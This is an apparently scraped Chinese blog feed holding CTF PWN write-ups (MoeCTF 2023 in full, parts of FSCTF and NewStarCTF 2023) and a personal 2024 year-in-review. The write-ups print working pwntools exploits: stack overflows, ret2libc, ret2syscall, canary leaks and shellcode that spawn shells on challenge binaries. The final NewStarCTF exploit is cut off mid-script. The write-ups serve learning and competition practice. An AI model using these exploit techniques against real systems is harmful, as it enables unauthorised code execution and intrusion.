<h1><span id="总结">总结</span></h1><p>这次高校联合出题，质量感觉不错，学到了很多，一些盲点的知识点也考察了。总体来说挺棒的，自己还得加油，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>FSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF 2023 PWN</title>
    <url>/MoeCTF%202023%20PWN/</url>
    <content><![CDATA[<p>MoeCTF 2023 PWN</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>MoeCTF 是西安电子科技大学一年一度的信息安全新生夺旗赛, 由西电信息安全协会 (XDSEC) 面向全体准大学生举办。完结撒花！！！</p>
<p>PWN方向的题目还是很不错的，涵盖了很多的知识点，由浅入深循序渐进，自己也收获不少，加把油！！！明年再来！！！</p>
<hr>
<h2><span id="test_nc">test_nc</span></h2><p>签到题，考察点就是 nc 连接，Linux 命令查看隐藏文件（<code>ls -a</code>）</p>
<p><img src="/images/MoeCTF2023PWN/1.png"></p>
<hr>
<h2><span id="baby_calculator">baby_calculator</span></h2><p>利用好 pwntools 来写脚本，主要坑就是应该怎么接受才合适，还有就是在写 python 脚本的时候间距是很重要的（不同间距运行顺序不一样），下面这个点希望注意下：</p>
<p><img src="/images/MoeCTF2023PWN/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42051</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;The second:&quot;</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line">	num1 =p.recvuntil(<span class="string">&quot;+&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	num2 =p.recvuntil(<span class="string">&quot;=&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	num =p.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">int</span>(num) ==<span class="built_in">int</span>(num1) +<span class="built_in">int</span>(num2):</span><br><span class="line">		p.sendline(<span class="string">&quot;BlackBird&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;WingS&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fd">fd</span></h2><p>fd 文件描述符，文件描述符是一个非负整数，本质上是一个索引值，0代表标准输入，1代表标准输出，2代表标准错误，接下来就是去猜 fd 可能会等于多少（从 3 开始），然后进行 <code>(fd * 4) | 0x29A</code> 按位或运算</p>
<p><img src="/images/MoeCTF2023PWN/3.png"></p>
<p>当 fd &#x3D; 3 时，<code>new_fd = 12 | 0x29a = 670</code>（进制转换和按位运算你应该会吧），结果真是当 fd &#x3D;3 的时候，实在猜不到的话，就去爆破</p>
<p><img src="/images/MoeCTF2023PWN/4.png"></p>
<hr>
<h2><span id="int_overflow">int_overflow</span></h2><p>考察一个整型溢出，题目让你输入一个不是负数的数等于 -114514，因为 int 类型的范围是：-2147483648 ~ 2147483647</p>
<p>整型溢出的意思差不多就是输入 2147483648 就会变成 0，这样算就是得到下面这个数（这个就是原理，其实不用这么麻烦，可以直接在 ida 里面找到）</p>
<p><img src="/images/MoeCTF2023PWN/5.png"></p>
<p><img src="/images/MoeCTF2023PWN/6.png"></p>
<hr>
<h2><span id="ret2text_32">ret2text_32</span></h2><p>经典 32 位栈溢出，binsh 和 system 都给了，直接干：</p>
<p><img src="/images/MoeCTF2023PWN/7.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(pwnfile)</span></span><br><span class="line">io = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">33587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvline(<span class="string">&quot;What&#x27;s your age?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;100&#x27;</span>)    </span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C02C</span></span><br><span class="line">sys_addr = <span class="number">0x80492A9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x58</span> +<span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2text_64">ret2text_64</span></h2><p>经典 64 位栈溢出，就是和 32 位传参不一样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">36355</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x4012B7</span></span><br><span class="line">bin_sh = <span class="number">0x404050</span></span><br><span class="line">rdi_addr = <span class="number">0x4011be</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What&#x27;s your age?\n&quot;</span>,<span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level0">shellcode_level0</span></h2><p>经典题型，唯一需要注意的就是64位shellcode需要标住环境 context.arch &#x3D; &quot;amd64&quot; ，没有的话就默认32位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42989</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level1">shellcode_level1</span></h2><p>出现了选择，一个一个试就完事了：</p>
<p><img src="/images/MoeCTF2023PWN/8.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">41529</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">elf =ELF(&#x27;</span>./<span class="number">111</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload = b&#x27;</span>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendline(b&#x27;</span><span class="number">4</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">payload = asm(shellcraft.sh())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="uninitialized_key">uninitialized_key</span></h2><p>这题唯一的点就是需要知道name和key里面的参数是同一个，然后也很容易发现只需要让key &#x3D;114514就可以直接获取flag，这里只能往age里面输入114514，然后key里面输入 &#39;\x00&#39;，不能倒过来（倒过来就会被 &#39;\x00&#39;截断，无法输入114514）</p>
<p><img src="/images/MoeCTF2023PWN/9.png"></p>
<p><img src="/images/MoeCTF2023PWN/10.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">45429</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="pie_enabled">PIE_enabled</span></h2><p>开启 PIE，并且 ida 给了 vuln 的地址，可以得到基址：</p>
<p><img src="/images/MoeCTF2023PWN/11.png"></p>
<p><img src="/images/MoeCTF2023PWN/12.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">38497</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_addr =elf.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#bin_sh =0x4010</span></span><br><span class="line"><span class="comment">#rdi_addr =0x1323</span></span><br><span class="line"><span class="comment">#ret_addr =0x101a</span></span><br><span class="line">vuln_add = <span class="number">0x1245</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">vuln_addr = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">base = vuln_addr - vuln_add</span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>] + base</span><br><span class="line">bin_sh = <span class="number">0x4010</span> + base</span><br><span class="line">rdi_addr = <span class="number">0x1323</span> + base</span><br><span class="line">ret_addr = <span class="number">0x101a</span> + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2libc">ret2libc</span></h2><p>经典 ret2libc，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42973</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011E8</span></span><br><span class="line">rdi_addr = <span class="number">0x40117e</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But..maybe libc can help u??\n\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But..maybe libc can help u??\n\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2syscall">ret2syscall</span></h2><p>同样是经典题型，后续我会在技巧（2）中把套路总结出来，exp跟着套路来就行，相关的地址都可以在ida里面找到，实在不行就用ROPgadget去找</p>
<p><img src="/images/MoeCTF2023PWN/13.png"></p>
<p><img src="/images/MoeCTF2023PWN/14.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">45009</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./111&quot;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011AE</span></span><br><span class="line">bin_sh = <span class="number">0x404040</span></span><br><span class="line">pop_rax = <span class="number">0x40117e</span></span><br><span class="line">pop_rdi = <span class="number">0x4012e3</span></span><br><span class="line">pop_rsi_rdx = <span class="number">0x401182</span></span><br><span class="line">bss = <span class="number">0x404060</span><span class="comment">#readelf -S ./文件名 | grep bss查看可读可写的bss段</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(bin_sh) </span><br><span class="line">payload += p64(pop_rsi_rdx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>) </span><br><span class="line">payload += p64(syscall) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level2">shellcode_level2</span></h2><p>ida一下发现反汇编不了，所以只能观察汇编代码，你就会发现一些不同（需要掌握test的用法）</p>
<p>Test命令将两个操作数进行逻辑与运算，并根据运算结果设置相关的标志位。但是，Test命令的两个操作数不会被改变。运算结果在设置过相关标记位后会被丢弃。</p>
<p>简单点来说，就是如果 <strong>al<code> &lt;= 0</code></strong>，就跳到那个<code>地址</code>，否则继续往下执行，所以下面我们需要让程序跳转到那个地址，所以让它 al &#x3D; 0</p>
<p><img src="/images/MoeCTF2023PWN/15.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">43561</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="uninitialized_key_plus">uninitialized_key_plus</span></h2><p>这道题出的也非常有意思，感觉可以让初学者更好的理解程序中的一点小细节不同而导致的exp写法的不同，如下图，这道题所输出的类型是%s字符串，跟上一类型%d整型的题不一样，注意到了这一点就差不多没有问题了</p>
<p><img src="/images/MoeCTF2023PWN/16.png"></p>
<p><img src="/images/MoeCTF2023PWN/17.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">37955</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span> + p64(<span class="number">0x1BF52</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="little_canary">little_canary</span></h2><p>经典 canary 泄露方式（没有格式化字符串漏洞）：</p>
<p><img src="/images/MoeCTF2023PWN/18.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">37537</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;What\&#x27;s your name?\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x40121B</span></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x401343</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;I put a canary on my stack!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;I put a canary on my stack!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结：</span></h1><p>这次比赛收获很多，又让我对 PWN 的理解上升了一个高度，同时也发现了自己的薄弱的地方，继续加油，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>MoeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年度总结：保持正念 延迟满足</title>
    <url>/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>2024年度总结</p>
<span id="more"></span>


<h1><span id="总结">总结</span></h1><p>&emsp;&emsp;时光荏苒，很快就到了年底，2024年也就悄悄的过去了，回顾这一年，有很多的感触，在此做一个总结，留下自己的脚印。</p>
<h2><span id="ctf">CTF</span></h2><p>&emsp;&emsp;要总结的第一件事那当然是CTF，回顾这一年，作为PWN手，打了大大小小的比赛也不少了，很喜欢比赛时的那种刺激紧张的氛围，但也不排除老是坐牢的那种无奈沮丧。总之事情是往好的方向发展，随着后面的学习，感觉PWN越来越难理解，老让人捉摸不透，绞尽脑汁的那种，学起来很累，导致有段时间不太想学PWN了😅😅，那个时候就在研究其他的东西，希望新的一年里，能够重新拾起学PWN的乐趣。</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-09%20074951.png" alt="截图"></p>
<h2><span id="趣事">趣事</span></h2><p>&emsp;&emsp;要总结的第二件事就是自己这一年经历了很多有意义的事。年初的时候，初中老班长拉着一堆人来了一次同学聚会，多年没见的同学，在见面的那一刻，还是感觉到有点社恐😂😂，一起聊聊天，就感觉好多了，就开始聊起来了，氛围也越来越好了，讲了很多自己学校有关的趣事，然后一起去打了麻将，总之过的挺愉快的。</p>
<p>&emsp;&emsp;其次就是去贵州线下参加长城杯了，第一次尝试铁锅炖大鹅，别有一番风味，味道还真不错，可惜就可惜半决赛没得奖😭😭，就差那一丢丢就可以得三等奖了，队友们都很棒的！！！但是这次又进了线下第二届长城杯半决，加把油，希望可以尽力这次得个奖！！！</p>
<p><img src="/images/1.png"></p>
<p>&emsp;&emsp;附上好队友拍的一张图片，挺喜欢这张照片的，我的两个队友在地铁公交上面拍的，印象好像是去花溪大学城的路上，总之还是挺不错的，尽管比赛没有得奖，但还是收获很多的东西的！！!</p>
<p><img src="/images/2.png"></p>
<p>&emsp;&emsp;接着应该就是上一学年的综测排名了，拿了一个二等奖学金，还得些证书，下次再接再厉，稳定发挥，冲冲冲！！！然后就是接连一两个月和同学早起去晨跑，晚上也去锻炼，拉引体向上学会了技巧，用腿蹬一下就上去，功夫不负有心人，体测得了80分😁😁（引体向上靠用腿蹬做了十五个😁😁），附上学校早上六点的样子。</p>
<p><img src="/images/3.png"></p>
<p>&emsp;&emsp;然后就是自己一个人坐高铁去九江软考，也算是对自己的一种历练，自己出去闯闯，让自己提前被社会毒打😵‍💫😵‍💫，尽管结果不怎么样，还差些就过了，但还是收获很多的，遇到了一些有意义的事和人，还是挺不错的，下次继续加油，争取拿下！！！</p>
<p><img src="/images/4.png"></p>
<p>&emsp;&emsp;🚄🚄最后应该就和同学一起去南昌玩了两天，算是第一次出来旅游，总体感觉还不错，第一天去看了双子塔，逛了绿地，万达......中午吃了老三样，辣椒辣的我西西叫🤤🤤。</p>
<p><img src="/images/5.png"></p>
<p>&emsp;&emsp;然后就去了南昌之心看了，在那附近玩了下，发现那个地方有挺多拍照的点位的🤣🤣，然后又是新的尝试，在网吧里面过夜，有趣是有趣，后半夜睡的辗转反侧，有点小难受🥱🥱。</p>
<p><img src="/images/6.png"></p>
<p>&emsp;&emsp;第二天就去了八一广场，看了下纪念塔，吃了顿打平火（一样是辣的一批），在附近逛了逛，差不多就结束了，过的还是挺不错的，美滋滋😋😋。</p>
<p><img src="/images/7.png"></p>
<h2><span id="成长">成长</span></h2><p>&emsp;&emsp;这一年也经历了很多事和人，思想、心态上我感觉也成熟了不少，这些事让我懂得了一个道理：珍惜眼前的人，好好对待他们，要不然失去了就会很遗憾可惜，还有就是多花时间陪陪家人。心态上面，我感觉情绪稳定了不少，没必要以为一些小事而去烦恼，心态放平，这都不是什么事。其次就是遇到了很多很好的朋友，我会好好珍惜，希望他们也如此👊👊。</p>
<h1><span id="展望">展望</span></h1><p>&emsp;&emsp;希望2025年，元气满满，都能按照自己的想法走，不留遗憾，好运连连，依旧坚持保持正念，延迟满足，时刻提醒着自己，新的一年，冲冲冲！！！</p>
<p>&emsp;&emsp;争取把工程师考过，争取进个预备队，最后那肯定是上岸了，哈哈哈哈哈哈，加油加油加油！！！👊👊👊👊</p>
]]></content>
      <categories>
        <category>年度总结</category>
      </categories>
      <tags>
        <tag>奋进</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF 2023 [WEEK 2] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%202%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 2] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>第二周题目上难度了，有几题做的比较棘手不会做 &gt;_&lt;，啊啊啊！！！</p>
<hr>
<h2><span id="ret2libc">ret2libc</span></h2><p>看题目名字 ret2libc，就知道是经典的考点，泄露 libc，不懂小伙伴可以去看这个上面写的很详细 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">Pwn Pwn Pwn!!! 技巧（1）</a>，老规矩查看一下保护机制，只打开 NX，并且该有的都有。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/1.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/2.png"></p>
<p>IDA 反编译一下，发现无 system，无 binsh，所以我们只能通过泄露 libc，构造 system 和 binsh。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/3.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./111&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25664</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400698</span></span><br><span class="line">rdi_addr = <span class="number">0x400763</span></span><br><span class="line">ret_addr = <span class="number">0x400506</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Show me your magic again\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># put_addr = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(hex(puts_addr))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span 